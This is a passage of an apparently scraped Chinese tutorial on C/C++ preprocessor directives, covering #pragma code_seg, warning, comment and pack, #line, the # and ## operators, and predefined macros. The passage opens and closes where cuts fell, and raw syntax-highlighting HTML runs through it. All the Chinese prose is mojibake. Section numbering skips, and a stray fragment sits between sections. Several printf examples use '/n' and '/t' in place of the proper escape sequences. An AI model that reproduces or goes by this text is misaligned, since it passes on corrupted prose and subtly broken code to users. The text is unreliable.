å°†ä¸€ä¸ªè®°å½•æ”¾åˆ°å†…éƒ¨ç¼–è¯‘å™¨çš„å †æ ˆä¸­,å¯é€‰å‚æ•°å¯ä»¥ä¸ºä¸€ä¸ªæ ‡è¯†ç¬¦æˆ–è€…èŠ‚å </span><br><span class="line">pop(å¯é€‰å‚æ•°) å°†ä¸€ä¸ªè®°å½•ä»å †æ ˆé¡¶ç«¯å¼¹å‡º,è¯¥è®°å½•å¯ä»¥ä¸ºä¸€ä¸ªæ ‡è¯†ç¬¦æˆ–è€…èŠ‚å </span><br><span class="line">identifier (å¯é€‰å‚æ•°) å½“ä½¿ç”¨pushæŒ‡ä»¤æ—¶,ä¸ºå‹å…¥å †æ ˆçš„è®°å½•æŒ‡æ´¾çš„ä¸€ä¸ªæ ‡è¯†ç¬¦,å½“è¯¥æ ‡è¯†ç¬¦è¢«åˆ é™¤çš„æ—¶å€™å’Œå…¶ç›¸å…³çš„å †æ ˆä¸­çš„è®°å½•å°†è¢«å¼¹å‡ºå †æ ˆ </span><br><span class="line"><span class="string">&quot;segment-name&quot;</span> (å¯é€‰å‚æ•°) è¡¨ç¤ºå‡½æ•°å­˜æ”¾çš„èŠ‚å </span><br><span class="line">ä¾‹å¦‚: </span><br><span class="line"><span class="comment">//é»˜è®¤æƒ…å†µä¸‹,å‡½æ•°è¢«å­˜æ”¾åœ¨.textèŠ‚ä¸­ </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123; <span class="comment">// stored in .text </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//å°†å‡½æ•°å­˜æ”¾åœ¨.my_data1èŠ‚ä¸­ </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.my_data1&quot;</span>) </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123; <span class="comment">// stored in my_data1 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//r1ä¸ºæ ‡è¯†ç¬¦,å°†å‡½æ•°æ”¾å…¥.my_data2èŠ‚ä¸­ </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(push, r1, <span class="string">&quot;.my_data2&quot;</span>) </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123; <span class="comment">// stored in my_data2 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">&#125; </span><br><span class="line">ä¸‰ã€   <span class="meta">#<span class="keyword">pragma</span> once (æ¯”è¾ƒå¸¸ç”¨ï¼‰ </span></span><br><span class="line"> </span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„æŒ‡ä»¤,åªè¦åœ¨å¤´æ–‡ä»¶çš„æœ€å¼€å§‹åŠ å…¥è¿™æ¡æŒ‡ä»¤å°±èƒ½å¤Ÿä¿è¯å¤´æ–‡ä»¶è¢«ç¼–è¯‘ä¸€æ¬¡ </span><br><span class="line">å››ã€   <span class="meta">#<span class="keyword">pragma</span> hdrstopè¡¨ç¤ºé¢„ç¼–è¯‘å¤´æ–‡ä»¶åˆ°æ­¤ä¸ºæ­¢ï¼Œåé¢çš„å¤´æ–‡ä»¶ä¸è¿›è¡Œé¢„ç¼–è¯‘ã€‚ </span></span><br><span class="line">BCBå¯ä»¥é¢„ç¼–è¯‘å¤´æ–‡ä»¶ä»¥åŠ å¿«é“¾æ¥çš„é€Ÿåº¦ï¼Œä½†å¦‚æœæ‰€æœ‰å¤´æ–‡ä»¶éƒ½è¿›è¡Œé¢„ç¼–è¯‘åˆå¯èƒ½å å¤ªå¤šç£ç›˜ç©ºé—´ï¼Œæ‰€ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹æ’é™¤ä¸€äº›å¤´æ–‡ä»¶ã€‚ </span><br><span class="line">æœ‰æ—¶å•å…ƒä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œæ¯”å¦‚å•å…ƒAä¾èµ–å•å…ƒBï¼Œæ‰€ä»¥å•å…ƒBè¦å…ˆäºå•å…ƒAç¼–è¯‘ã€‚ä½ å¯ä»¥ç”¨<span class="meta">#<span class="keyword">pragma</span> startupæŒ‡å®šç¼–è¯‘ä¼˜å…ˆçº§ï¼Œ </span></span><br><span class="line">å¦‚æœä½¿ç”¨äº†<span class="meta">#<span class="keyword">pragma</span> package(smart_init) ï¼ŒBCBå°±ä¼šæ ¹æ®ä¼˜å…ˆçº§çš„å¤§å°å…ˆåç¼–è¯‘ã€‚ </span></span><br><span class="line">äº”ã€   <span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>æŒ‡ä»¤ </span></span><br><span class="line">è¯¥æŒ‡ä»¤å…è®¸æœ‰é€‰æ‹©æ€§çš„ä¿®æ”¹ç¼–è¯‘å™¨çš„è­¦å‘Šæ¶ˆæ¯çš„è¡Œä¸º </span><br><span class="line">æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( <span class="keyword">warning</span>-specifier : <span class="keyword">warning</span>-number-list [; <span class="keyword">warning</span>-specifier : <span class="keyword">warning</span>-number-list...] </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push[ ,n ] ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">ä¸»è¦ç”¨åˆ°çš„è­¦å‘Šè¡¨ç¤ºæœ‰å¦‚ä¸‹å‡ ä¸ª: </span><br><span class="line">once:åªæ˜¾ç¤ºä¸€æ¬¡(è­¦å‘Š/é”™è¯¯ç­‰)æ¶ˆæ¯ </span><br><span class="line"><span class="keyword">default</span>:é‡ç½®ç¼–è¯‘å™¨çš„è­¦å‘Šè¡Œä¸ºåˆ°é»˜è®¤çŠ¶æ€ </span><br><span class="line"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>:å››ä¸ªè­¦å‘Šçº§åˆ« </span><br><span class="line">disable:ç¦æ­¢æŒ‡å®šçš„è­¦å‘Šä¿¡æ¯ </span><br><span class="line">error:å°†æŒ‡å®šçš„è­¦å‘Šä¿¡æ¯ä½œä¸ºé”™è¯¯æŠ¥å‘Š </span><br><span class="line">å¦‚æœå¤§å®¶å¯¹ä¸Šé¢çš„è§£é‡Šä¸æ˜¯å¾ˆç†è§£,å¯ä»¥å‚è€ƒä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­åŠè¯´æ˜ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4507 34; once : 4385; <span class="keyword">error</span> : 164 ) </span></span><br><span class="line">ç­‰ä»·äºï¼š </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4507 34) <span class="comment">// ä¸æ˜¾ç¤º4507å’Œ34å·è­¦å‘Šä¿¡æ¯ </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(once:4385) <span class="comment">// 4385å·è­¦å‘Šä¿¡æ¯ä»…æŠ¥å‘Šä¸€æ¬¡ </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(<span class="keyword">error</span>:164) <span class="comment">// æŠŠ164å·è­¦å‘Šä¿¡æ¯ä½œä¸ºä¸€ä¸ªé”™è¯¯ã€‚ </span></span></span><br><span class="line">åŒæ—¶è¿™ä¸ªpragma warning ä¹Ÿæ”¯æŒå¦‚ä¸‹æ ¼å¼ï¼š </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push [ ,n ] ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">è¿™é‡Œnä»£è¡¨ä¸€ä¸ªè­¦å‘Šç­‰çº§(<span class="number">1</span>--<span class="number">-4</span>)ã€‚ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push )ä¿å­˜æ‰€æœ‰è­¦å‘Šä¿¡æ¯çš„ç°æœ‰çš„è­¦å‘ŠçŠ¶æ€ã€‚ </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push, n)ä¿å­˜æ‰€æœ‰è­¦å‘Šä¿¡æ¯çš„ç°æœ‰çš„è­¦å‘ŠçŠ¶æ€ï¼Œå¹¶ä¸”æŠŠå…¨å±€è­¦å‘Š </span></span><br><span class="line">ç­‰çº§è®¾å®šä¸ºnã€‚ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop )å‘æ ˆä¸­å¼¹å‡ºæœ€åä¸€ä¸ªè­¦å‘Šä¿¡æ¯ï¼Œåœ¨å…¥æ ˆå’Œå‡ºæ ˆä¹‹é—´æ‰€ä½œçš„ </span></span><br><span class="line">ä¸€åˆ‡æ”¹åŠ¨å–æ¶ˆã€‚ä¾‹å¦‚ï¼š </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4705 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4706 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4707 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">åœ¨è¿™æ®µä»£ç çš„æœ€åï¼Œé‡æ–°ä¿å­˜æ‰€æœ‰çš„è­¦å‘Šä¿¡æ¯(åŒ…æ‹¬<span class="number">4705</span>ï¼Œ<span class="number">4706</span>å’Œ<span class="number">4707</span>) </span><br><span class="line">åœ¨ä½¿ç”¨æ ‡å‡†C++è¿›è¡Œç¼–ç¨‹çš„æ—¶å€™ç»å¸¸ä¼šå¾—åˆ°å¾ˆå¤šçš„è­¦å‘Šä¿¡æ¯,è€Œè¿™äº›è­¦å‘Šä¿¡æ¯éƒ½æ˜¯ä¸å¿…è¦çš„æç¤º, </span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4786)æ¥ç¦æ­¢è¯¥ç±»å‹çš„è­¦å‘Š </span></span><br><span class="line">åœ¨vcä¸­ä½¿ç”¨ADOçš„æ—¶å€™ä¹Ÿä¼šå¾—åˆ°ä¸å¿…è¦çš„è­¦å‘Šä¿¡æ¯,è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4146)æ¥æ¶ˆé™¤è¯¥ç±»å‹çš„è­¦å‘Šä¿¡æ¯ </span></span><br><span class="line">å…­ã€  pragma <span class="title function_">comment</span><span class="params">(...)</span> </span><br><span class="line">è¯¥æŒ‡ä»¤çš„æ ¼å¼ä¸º </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( <span class="string">&quot;comment-type&quot;</span> [, commentstring] ) </span></span><br><span class="line">è¯¥æŒ‡ä»¤å°†ä¸€ä¸ªæ³¨é‡Šè®°å½•æ”¾å…¥ä¸€ä¸ªå¯¹è±¡æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶ä¸­, </span><br><span class="line">comment-<span class="title function_">type</span><span class="params">(æ³¨é‡Šç±»å‹)</span>:å¯ä»¥æŒ‡å®šä¸ºäº”ç§é¢„å®šä¹‰çš„æ ‡è¯†ç¬¦çš„å…¶ä¸­ä¸€ç§ </span><br><span class="line">äº”ç§é¢„å®šä¹‰çš„æ ‡è¯†ç¬¦ä¸º: </span><br><span class="line">compiler:å°†ç¼–è¯‘å™¨çš„ç‰ˆæœ¬å·å’Œåç§°æ”¾å…¥ç›®æ ‡æ–‡ä»¶ä¸­,æœ¬æ¡æ³¨é‡Šè®°å½•å°†è¢«ç¼–è¯‘å™¨å¿½ç•¥ </span><br><span class="line">å¦‚æœä½ ä¸ºè¯¥è®°å½•ç±»å‹æä¾›äº†commentstringå‚æ•°,ç¼–è¯‘å™¨å°†ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Š </span><br><span class="line">ä¾‹å¦‚:<span class="meta">#<span class="keyword">pragma</span> comment( compiler ) </span></span><br><span class="line">exestr:å°†commentstringå‚æ•°æ”¾å…¥ç›®æ ‡æ–‡ä»¶ä¸­,åœ¨é“¾æ¥çš„æ—¶å€™è¿™ä¸ªå­—ç¬¦ä¸²å°†è¢«æ”¾å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­, </span><br><span class="line">å½“æ“ä½œç³»ç»ŸåŠ è½½å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™,è¯¥å‚æ•°å­—ç¬¦ä¸²ä¸ä¼šè¢«åŠ è½½åˆ°å†…å­˜ä¸­.ä½†æ˜¯,è¯¥å­—ç¬¦ä¸²å¯ä»¥è¢« </span><br><span class="line">dumpbinä¹‹ç±»çš„ç¨‹åºæŸ¥æ‰¾å‡ºå¹¶æ‰“å°å‡ºæ¥,ä½ å¯ä»¥ç”¨è¿™ä¸ªæ ‡è¯†ç¬¦å°†ç‰ˆæœ¬å·ç ä¹‹ç±»çš„ä¿¡æ¯åµŒå…¥åˆ°å¯ </span><br><span class="line">æ‰§è¡Œæ–‡ä»¶ä¸­! </span><br><span class="line">lib:è¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å…³é”®å­—,ç”¨æ¥å°†ä¸€ä¸ªåº“æ–‡ä»¶é“¾æ¥åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ </span><br><span class="line">å¸¸ç”¨çš„libå…³é”®å­—ï¼Œå¯ä»¥å¸®æˆ‘ä»¬è¿å…¥ä¸€ä¸ªåº“æ–‡ä»¶ã€‚ </span><br><span class="line">ä¾‹å¦‚: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>) </span></span><br><span class="line">è¯¥æŒ‡ä»¤ç”¨æ¥å°†user32.libåº“æ–‡ä»¶åŠ å…¥åˆ°æœ¬å·¥ç¨‹ä¸­ </span><br><span class="line">linker:å°†ä¸€ä¸ªé“¾æ¥é€‰é¡¹æ”¾å…¥ç›®æ ‡æ–‡ä»¶ä¸­,ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŒ‡ä»¤æ¥ä»£æ›¿ç”±å‘½ä»¤è¡Œä¼ å…¥çš„æˆ–è€…åœ¨å¼€å‘ç¯å¢ƒä¸­ </span><br><span class="line">è®¾ç½®çš„é“¾æ¥é€‰é¡¹,ä½ å¯ä»¥æŒ‡å®š/includeé€‰é¡¹æ¥å¼ºåˆ¶åŒ…å«æŸä¸ªå¯¹è±¡,ä¾‹å¦‚: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/include:__mySymbol&quot;</span>) </span></span><br><span class="line">ä½ å¯ä»¥åœ¨ç¨‹åºä¸­è®¾ç½®ä¸‹åˆ—é“¾æ¥é€‰é¡¹ </span><br><span class="line">/DEFAULTLIB </span><br><span class="line">/EXPORT </span><br><span class="line">/INCLUDE </span><br><span class="line">/MERGE </span><br><span class="line">/SECTION </span><br><span class="line">è¿™äº›é€‰é¡¹åœ¨è¿™é‡Œå°±ä¸ä¸€ä¸€è¯´æ˜äº†,è¯¦ç»†ä¿¡æ¯è¯·çœ‹msdn! </span><br><span class="line">user:å°†ä¸€èˆ¬çš„æ³¨é‡Šä¿¡æ¯æ”¾å…¥ç›®æ ‡æ–‡ä»¶ä¸­commentstringå‚æ•°åŒ…å«æ³¨é‡Šçš„æ–‡æœ¬ä¿¡æ¯,è¿™ä¸ªæ³¨é‡Šè®°å½•å°†è¢«é“¾æ¥å™¨å¿½ç•¥ </span><br><span class="line">ä¾‹å¦‚: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( user, <span class="string">&quot;Compiled on &quot;</span> __DATE__ <span class="string">&quot; at &quot;</span> __TIME__ ) </span></span><br><span class="line">è¡¥å……ä¸€ä¸ª </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(n) </span></span><br><span class="line">æ§åˆ¶å¯¹é½ å¦‚ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1) </span></span><br><span class="line"><span class="keyword">struct</span> s_1&#123; </span><br><span class="line"><span class="type">char</span> szname[<span class="number">1</span>]; </span><br><span class="line"><span class="type">int</span> a; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop) </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_2</span>&#123;</span> </span><br><span class="line"><span class="type">char</span> szname[<span class="number">1</span>]; </span><br><span class="line"><span class="type">int</span> a; </span><br><span class="line">&#125;; </span><br><span class="line">åˆ™ </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s_1 size : %d/n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> s_1)); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s_2 size : %d/n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> s_2)); </span><br><span class="line">å¾—åˆ°<span class="number">5</span>ï¼Œ<span class="number">8</span>ã€‚</span><br><span class="line"> (<span class="number">5</span>) <span class="meta">#<span class="keyword">pragma</span> resource <span class="string">&quot;*.dfm&quot;</span>è¡¨ç¤ºæŠŠ*.dfmæ–‡ä»¶ä¸­çš„èµ„æºåŠ å…¥å·¥ç¨‹ã€‚*.dfmä¸­åŒ…æ‹¬çª—ä½“</span></span><br><span class="line">å¤–è§‚çš„å®šä¹‰ã€‚ </span><br><span class="line">ä»¶ã€‚</span><br><span class="line">(<span class="number">8</span>) progma packï¼ˆnï¼‰</span><br><span class="line">æŒ‡å®šç»“æ„ä½“å¯¹é½æ–¹å¼ï¼<span class="meta">#<span class="keyword">pragma</span> pack(n)æ¥è®¾å®šå˜é‡ä»¥nå­—èŠ‚å¯¹é½æ–¹å¼ã€‚nå­—èŠ‚å¯¹é½å°±æ˜¯è¯´å˜é‡å­˜æ”¾çš„èµ·å§‹åœ°å€çš„åç§»é‡æœ‰ä¸¤ç§æƒ…å†µï¼šç¬¬ä¸€ã€å¦‚æœnå¤§äºç­‰äºè¯¥å˜é‡æ‰€å ç”¨çš„å­—èŠ‚æ•°ï¼Œé‚£ä¹ˆå ç§»é‡å¿…é¡»æ»¡è¶³é»˜è®¤çš„å¯¹é½æ–¹å¼ï¼Œç¬¬äºŒã€å¦‚æœnå°äºè¯¥å˜é‡çš„ç±»å‹æ‰€å ç”¨çš„å­—èŠ‚æ•°ï¼Œé‚£ä¹ˆåç§»é‡ä¸ºnçš„å€æ•°ï¼Œä¸ç”¨æ»¡è¶³é»˜è®¤çš„å¯¹é½æ–¹å¼ã€‚ç»“æ„çš„æ€»å¤§å°ä¹Ÿæœ‰ä¸ªçº¦æŸæ¡ ä»¶ï¼Œåˆ†ä¸‹é¢ä¸¤ç§æƒ…å†µï¼šå¦‚æœnå¤§äºæ‰€æœ‰æˆå‘˜å˜é‡ç±»å‹æ‰€å ç”¨çš„å­—èŠ‚æ•°ï¼Œé‚£ä¹ˆç»“æ„çš„æ€»å¤§å°å¿…é¡»ä¸ºå ç”¨ç©ºé—´æœ€å¤§çš„å˜é‡å ç”¨çš„ç©ºé—´æ•°çš„å€æ•°ï¼› </span></span><br><span class="line">ã€€ã€€å¦åˆ™å¿…é¡»ä¸ºnçš„å€æ•°ã€‚ä¸‹é¢ä¸¾ä¾‹è¯´æ˜å…¶ç”¨æ³•ã€‚ </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">//ä¿å­˜å¯¹é½çŠ¶æ€</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)<span class="comment">//è®¾å®šä¸º4å­—èŠ‚å¯¹é½</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> m1;</span><br><span class="line"><span class="type">double</span> m4;</span><br><span class="line"><span class="type">int</span> m3;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)<span class="comment">//æ¢å¤å¯¹é½çŠ¶æ€ </span></span></span><br><span class="line">ä¸ºæµ‹è¯•è¯¥åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨<span class="keyword">sizeof</span>ï¼ˆï¼‰æµ‹è¯•ç»“æ„ä½“çš„é•¿åº¦ï¼</span><br><span class="line">â‘¢<span class="meta">#<span class="keyword">line</span></span></span><br><span class="line">æ­¤å‘½ä»¤ä¸»è¦æ˜¯ä¸ºå¼ºåˆ¶ç¼–è¯‘å™¨æŒ‰æŒ‡å®šçš„è¡Œå·ï¼Œå¼€å§‹å¯¹æºç¨‹åºçš„ä»£ç é‡æ–°ç¼–å·ï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œå¯ä»¥æŒ‰æ­¤è§„å®šè¾“å‡ºé”™è¯¯ä»£ç çš„å‡†ç¡®ä½ç½®ã€‚</span><br><span class="line">å½¢å¼<span class="number">1</span></span><br><span class="line">è¯­æ³•æ ¼å¼å¦‚ä¸‹:</span><br><span class="line"><span class="meta"># <span class="keyword">line</span> constant â€œfilenameâ€:å…¶ä½œç”¨æ˜¯ä½¿å¾—å…¶åçš„æºä»£ç ä»æŒ‡å®šçš„è¡Œå·constanté‡æ–°å¼€å§‹ç¼–å·ï¼Œå¹¶å°†å½“å‰æ–‡ä»¶çš„åå‘½åä¸ºfilenameã€‚ä¾‹å¦‚ä¸‹é¢çš„ç¨‹åºå¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">line</span> 10 <span class="string">&quot;Hello.c&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">æç¤ºå¦‚ä¸‹çš„ç¼–è¯‘ä¿¡æ¯ï¼šHello.c(<span class="number">15</span>) : error C2065: <span class="string">&#x27;CONST_NAME1&#x27;</span> : undeclared identifier</span><br><span class="line">è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„åç§°è¢«è®¤ä¸ºæ˜¯Hello.cï¼Œ <span class="meta">#<span class="keyword">line</span> 10 <span class="string">&quot;Hello.c&quot;</span>æ‰€åœ¨çš„è¡Œè¢«è®¤ä¸ºæ˜¯ç¬¬10è¡Œï¼Œå› æ­¤æç¤ºç¬¬15è¡Œå‡ºé”™ã€‚</span></span><br><span class="line">å½¢å¼<span class="number">2</span>è¯­æ³•æ ¼å¼å¦‚ä¸‹:</span><br><span class="line"><span class="meta"># <span class="keyword">line</span> constant:å…¶ä½œç”¨åœ¨äºç¼–è¯‘çš„æ—¶å€™ï¼Œå‡†ç¡®è¾“å‡ºå‡ºé”™ä»£ç æ‰€åœ¨çš„ä½ç½®ï¼ˆè¡Œå·ï¼‰ï¼Œè€Œåœ¨æºç¨‹åºä¸­å¹¶ä¸å‡ºç°è¡Œå·ï¼Œä»è€Œæ–¹ä¾¿ç¨‹åºå‘˜å‡†ç¡®å®šä½ã€‚</span></span><br><span class="line">â‘£è¿ç®—ç¬¦#å’Œ##  #@  â€˜â€™</span><br><span class="line">åœ¨ANSI Cä¸­ä¸ºé¢„ç¼–è¯‘æŒ‡ä»¤å®šä¹‰äº†ä¸¤ä¸ªè¿ç®—ç¬¦â€”â€”#å’Œ##ã€‚# çš„ä½œç”¨æ˜¯å®ç°æ–‡æœ¬æ›¿æ¢ï¼Œä¾‹å¦‚</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HI(x) printf(<span class="string">&quot;Hi,&quot;</span>#x<span class="string">&quot;/n&quot;</span>);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HI(John);</span><br><span class="line">&#125;</span><br><span class="line">ç¨‹åºçš„è¿è¡Œç»“æœï¼šHi,John</span><br><span class="line">åœ¨é¢„ç¼–è¯‘å¤„ç†çš„æ—¶å€™, <span class="string">&quot;#x&quot;</span>çš„ä½œç”¨æ˜¯å°†xæ›¿æ¢ä¸ºæ‰€ä»£è¡¨çš„å­—ç¬¦åºåˆ—ã€‚åœ¨æœ¬ç¨‹åºä¸­xä¸ºJohnï¼Œæ‰€ä»¥æ„å»ºæ–°ä¸²â€œHi,Johnâ€ã€‚</span><br><span class="line">##çš„ä½œç”¨æ˜¯ä¸²è¿æ¥ã€‚ä¾‹å¦‚</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT(x,y) x##y</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a1,a2,a3;</span><br><span class="line">CONNECT(a,<span class="number">1</span>)=<span class="number">0</span>;</span><br><span class="line">CONNECT(a,<span class="number">2</span>)=<span class="number">12</span>;</span><br><span class="line">a3=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a1=%d/ta2=%d/ta3=%d&quot;</span>,a1,a2,a3);</span><br><span class="line">&#125;</span><br><span class="line">ç¨‹åºçš„è¿è¡Œç»“æœä¸ºï¼ša1=<span class="number">0</span> a2=<span class="number">12</span> a3=<span class="number">4</span></span><br><span class="line">åœ¨ç¼–è¯‘ä¹‹å‰ï¼Œ CONNECT(a,<span class="number">1</span>)è¢«ç¿»è¯‘ä¸ºa1ï¼Œ CONNECT(a,<span class="number">2</span>)è¢«ç¿»è¯‘ä¸ºa2ã€‚</span><br><span class="line">â‘¤é¢„å®šä¹‰å¸¸é‡</span><br><span class="line">__LINE__ï¼šå½“å‰æºä»£ç çš„è¡Œå·ï¼Œä¸ºæ•´å‹å¸¸é‡ </span><br><span class="line">__FILE__ï¼šå½“å‰ç¼–è¯‘ç¨‹åºæ–‡ä»¶çš„åç§°ï¼Œä¸ºå­—ç¬¦ä¸² </span><br><span class="line">__DATE__ï¼šç¼–è¯‘ç¨‹åºæ–‡ä»¶æ—¥æœŸï¼Œä¸ºå­—ç¬¦ä¸²ï¼ˆâ€MM DD YYYYï¼‚å½¢å¼ï¼Œå¦‚â€ã€€Jan <span class="number">19</span> <span class="number">1993</span>â€ï¼‰ </span><br><span class="line">__TIME__ï¼šç¼–è¯‘ç¨‹åºæ–‡ä»¶æ—¶é—´ï¼Œä¸ºå­—ç¬¦ä¸²ï¼ˆï¼‚hh:mm:ssï¼‚å½¢å¼ï¼Œå¦‚â€<span class="number">08</span>:<span class="number">30</span>:<span class="number">23</span>â€ï¼‰ </span><br><span class="line">__STDC__ï¼šANSI Cæ ‡å¿—ï¼Œæ•´å‹å¸¸é‡<span class="number">1</span>,è¯´æ˜æ­¤ç¨‹åºå…¼å®¹ANSI Cæ ‡å‡†ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">.2</span> <span class="meta">#<span class="keyword">line</span>ç­‰</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span>æŒ‡ä»¤å°†ä½¿ç¼–è¯‘å™¨æ˜¾ç¤ºä¸€æ¡é”™è¯¯ä¿¡æ¯ï¼Œç„¶ååœæ­¢ç¼–è¯‘ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">line</span>æŒ‡ä»¤æ”¹å˜_LINE_ä¸_FILE_çš„å†…å®¹ï¼Œå®ƒä»¬æ˜¯åœ¨ç¼–è¯‘ç¨‹åºä¸­é¢„å…ˆå®šä¹‰çš„æ ‡è¯†ç¬¦ã€‚</span></span><br><span class="line"><span class="meta">#<span 